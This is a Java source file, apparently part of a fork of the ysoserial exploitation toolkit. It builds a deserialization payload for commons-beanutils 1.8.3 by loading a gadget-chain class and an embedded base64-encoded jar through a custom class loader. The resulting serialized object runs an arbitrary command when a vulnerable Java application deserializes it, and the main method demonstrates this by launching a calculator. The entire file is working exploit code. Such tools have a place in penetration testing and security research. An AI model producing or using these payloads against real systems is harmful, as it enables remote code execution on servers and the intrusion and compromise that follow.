package ysoserial.payloads;

import sun.misc.BASE64Decoder;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.CommonUtils;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.SuidClassLoader;

import java.io.InputStream;
import java.lang.reflect.Method;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.w4 })
public class CommonsBeanutils1_183 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        SuidClassLoader suidClassLoader = new SuidClassLoader();
        suidClassLoader.addClass(CommonsBeanutils1.class.getName(), ClassFiles.classAsBytes(CommonsBeanutils1.class));
        InputStream inputStream = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream("commons-beanutils-1.8.3.txt");
        byte[] jarBytes = new BASE64Decoder().decodeBuffer(CommonUtils.readStringFromInputStream(inputStream));
        suidClassLoader.addJar(jarBytes);
        Class clsGadget = suidClassLoader.loadClass("ysoserial.payloads.CommonsBeanutils1");
        Object objGadget = clsGadget.newInstance();
        Method getObject = objGadget.getClass().getDeclaredMethod("getObject",String.class);
        Object objPayload = getObject.invoke(objGadget,command);
        suidClassLoader.cleanLoader();
        return objPayload;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1_183.class, new String[]{"open -a Calculator"});
    }
}
